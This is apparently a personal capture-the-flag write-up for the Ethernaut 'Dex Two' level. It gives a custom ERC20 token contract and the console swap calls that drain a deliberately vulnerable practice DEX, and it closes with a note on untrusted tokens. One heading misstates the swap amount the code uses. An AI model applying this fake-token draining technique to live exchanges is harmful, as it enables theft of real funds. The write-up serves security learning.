## Dex Two

Difficulty 4/10

This level will ask you to break `DexTwo`, a subtlely modified `Dex` contract from the previous level, in a different way.

You need to drain all balances of token1 and token2 from the `DexTwo` contract to succeed in this level.

You will still start with 10 tokens of `token1` and 10 of `token2`. The DEX contract still starts with 100 of each token.

  Things that might help:

-   How has the `swap` method been modified?
-   Could you use a custom token contract in your attack?

Create a new token `token3` with 10 ** 20 supply
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Token3 is ERC20 {

    constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
    }

}
```

![[Pasted image 20220311143119.png]]

transfer all to player wallet
![[Pasted image 20220311143705.png]]

approve the dex, player
![[Pasted image 20220311145437.png]]

add 100 token3 to Dex:
`contract.add_liquidity('0x353406DbDA6B1Bc9ba79007303baD099016Cf6D5', 100)`

approve instance, player:
```
contract.approve(instance, 1000)
contract.approve(player, 1000)
```

price is calculated same way as Dex 1; dex has 100 token3 and 100 token1 so we can change 1 for 1

```js
let t1 = await contract.token1()
let t2 = await contract.token2()
let t3 = '[token3 contract address]'
contract.swap(t3, t1, 100)
await contract.balanceOf(t3, instance)
	o {negative: 0, words: Array(2), length: 1, red: null}
	length: 1
	negative: 0
	red: null
	words: (2) [200, empty]
	[[Prototype]]: Object
await contract.balanceOf(t1, instance)
	o {negative: 0, words: Array(2), length: 1, red: null}
	length: 1
	negative: 0
	red: null
	words: (2) [0, empty] // <- 0
	[[Prototype]]: Object
```

now dex has 200 token3, 0 token1, and 100 token2. to get token2, we need to send more but ok since we have `10 ** 20 - 200` token3

solving amount to send like Dex 1 chal
```
swap_amount = (x * from) / to
100 = (x * 100) / 200
x = 200
```

swap 50 token3 for 100 token2:
```js
contract.swap(t3, t2, 200)
await contract.balanceOf(t2, instance)
	o {negative: 0, words: Array(2), length: 1, red: null}
	length: 1
	negative: 0
	red: null
	words: (2) [0, empty] // <- 0
	[[Prototype]]: Object
```

END:

Level completed!
Difficulty 4/10

As we've repeatedly seen, interaction between contracts can be a source of unexpected behavior.

Just because a contract claims to implement the ERC20 spec does not mean it's trust worthy.

Some tokens deviate from the ERC20 spec by not returning a boolean value from their transfer methods. See Missing return value bug - At least 130 tokens affected.

Other ERC20 tokens, especially those designed by adversaries could behave more maliciously.

If you design a DEX where anyone could list their own tokens without the permission of a central authority, then the correctness of the DEX could depend on the interaction of the DEX contract and the token contracts being traded.